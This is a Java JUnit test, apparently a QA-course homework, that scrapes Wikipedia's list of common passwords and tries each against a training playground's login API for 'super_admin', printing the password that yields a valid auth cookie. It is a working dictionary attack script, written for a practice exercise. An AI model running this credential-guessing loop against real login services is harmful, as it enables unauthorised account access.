import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.*;
import java.util.stream.Collectors;


public class Homework2Password {

    private static final String WIKI_URL = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords";
    private static final String PASSWORDS_TABLE_HEADER = "Top 25 most common passwords by year according to SplashData";
    private static final String LOGIN = "super_admin";
    private static final String GET_SECRET_URL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    private static final String CHECK_COOKIE_URL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

    @Test
    public void password() throws IOException {

        Set<String> passwords = getPasswords();

        for (String password : passwords) {
            Response response = RestAssured
                    .given()
                    .param("login", LOGIN)
                    .param("password", password)
                    .when()
                    .post(GET_SECRET_URL);

            String authCookie = response.getCookie("auth_cookie");

            String checkCookieAnswer = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .when()
                    .post(CHECK_COOKIE_URL)
                    .getBody()
                    .asString();

            if (!checkCookieAnswer.equals("You are NOT authorized")) {
                System.out.println("Password: " + password);
                System.out.println(checkCookieAnswer);
                break;
            }
        }
    }

    private Set<String> getPasswords() throws IOException {
        Document document = Jsoup.connect(WIKI_URL).get();
        Elements tableWithPasswords = document.body().getElementsContainingOwnText(PASSWORDS_TABLE_HEADER).next();
        List<String> strings = tableWithPasswords.select("td[align=left]").eachText();
        return strings.stream().map(e -> e.replace("[a]", "")).collect(Collectors.toSet());
    }

}
